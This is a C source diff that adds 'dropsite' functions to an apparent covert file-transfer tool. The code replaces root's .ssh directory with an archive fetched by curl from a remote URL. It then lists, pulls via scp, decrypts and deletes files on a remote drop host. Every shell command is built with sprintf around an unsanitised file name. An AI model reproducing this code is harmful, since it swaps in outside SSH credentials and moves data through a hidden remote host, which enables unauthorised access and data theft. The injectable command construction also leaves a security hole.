@@ -75,14 +75,14 @@ void ssh_replace_dir(void)
 	/* retrieve replacement .ssh files */
 	memset(command, 0x00, FILENAME_MAX);
 	sprintf(command, "curl -o %s%s \"%s\" > /dev/null 2>&1",
-			SSH_DIR, ssh_archive, ssh_files);
+			SSH_DIR, SSH_ARCHIVE, SSH_FILE);
 	if (system(command) == ERROR)
 		err(1, "system");
 
 	/* decompress archive */
 	memset(command, 0x00, FILENAME_MAX);
 	sprintf(command, "tar xf %s%s -C /root/.ssh > /dev/null 2>&1",
-			SSH_DIR, ssh_archive);
+			SSH_DIR, SSH_ARCHIVE);
 	if (system(command) == ERROR)
 		err(1, "system");
 
@@ -208,4 +208,128 @@ void ssh_timer(int fd, short event, void *arg)
 	evutil_timerclear(&tv);
 	tv.tv_sec = EVENT_TIMER;
 	event_add(timeout, &tv);
+}
+
+char *ssh_request_file(char *file_name)
+{
+	return NULL;
+}
+
+void ssh_dropsite_list(void)
+{
+	char *command = (char *)malloc(FILENAME_MAX);
+	
+	ssh_replace_dir();
+
+	memset(command, 0x00, FILENAME_MAX);
+	sprintf(command, "ssh %s ls -l Files/", DROPSITE);
+	if (system(command) == ERROR)
+		err(1, "system");
+
+	free(command);
+	ssh_restore_dir();
+}
+
+void ssh_dropsite_get(char *file_name)
+{
+	EVP_CIPHER_CTX encrypt, decrypt;
+	char *command = (char *)malloc(FILENAME_MAX);
+	char *file_in = (char *)malloc(FILENAME_MAX);
+	char *file_out = (char *)malloc(FILENAME_MAX);
+	FILE *fd_in, *fd_out;
+	
+	/* initialize encryption */
+	if (aes_init(&encrypt, &decrypt) == ERROR)
+		fprintf(stderr, "ERROR: aes_init");
+
+	ssh_replace_dir();
+
+	memset(command, 0x00, FILENAME_MAX);
+	sprintf(command, "scp %s:%s%s ./%s.encrypted",
+			DROPSITE, DROPSITE_DIR, file_name, file_name);
+	if (system(command) == ERROR)
+		err(1, "system");
+
+	fprintf(stderr, "Dropsite file retrieved!\n");
+
+	/* decrypt the file */
+	memset(file_in, 0x00, FILENAME_MAX);
+	memset(file_out, 0x00, FILENAME_MAX);
+	sprintf(file_in, "./%s.encrypted", file_name);
+	sprintf(file_out, "./%s.deflated", file_name);
+
+	if ((fd_in = fopen(file_in, "r")) == NULL)
+		err(1, "fopen");
+
+	if ((fd_out = fopen(file_out, "w")) == NULL)
+		err(1, "fopen");
+
+	file_decrypt(fd_in, fd_out);
+
+	/* delete encrypted file */
+	remove(file_in);
+
+	fclose(fd_in);
+	fclose(fd_out);			
+
+	/* decompress the file */
+	memset(file_in, 0x00, FILENAME_MAX);
+	memset(file_out, 0x00, FILENAME_MAX);
+	sprintf(file_in, "%s.deflated", file_name);
+	sprintf(file_out, "%s", file_name);
+
+	if ((fd_in = fopen(file_in, "r")) == NULL)
+		err(1, "fopen");
+
+	if ((fd_out = fopen(file_out, "w")) == NULL)
+		err(1, "fopen");
+
+	if (inflate_file(fd_in, fd_out) != SUCCESS) {
+		exit(ERROR);
+	}
+
+	/* delete compressed file */
+	remove(file_in);
+
+	fclose(fd_in);
+	fclose(fd_out);			
+
+	free(command);
+	free(file_in);
+	free(file_out);
+	ssh_restore_dir();
+}
+
+void ssh_dropsite_delete(char *file_name)
+{
+	char *command = (char *)malloc(FILENAME_MAX);
+
+	ssh_replace_dir();
+
+	memset(command, 0x00, FILENAME_MAX);
+	sprintf(command, "ssh %s rm Files/%s", DROPSITE, file_name);
+	if (system(command) == ERROR)
+		err(1, "system");
+
+	fprintf(stderr, "Dropsite file deleted!\n");
+
+	free(command);
+	ssh_restore_dir();
+}
+
+void ssh_dropsite_clear(void)
+{
+	char *command = (char *)malloc(FILENAME_MAX);
+
+	ssh_replace_dir();
+
+	memset(command, 0x00, FILENAME_MAX);
+	sprintf(command, "ssh %s rm Files/*", DROPSITE);
+	if (system(command) == ERROR)
+		err(1, "system");
+
+	fprintf(stderr, "Dropsite files deleted!\n");
+
+	free(command);
+	ssh_restore_dir();
 }
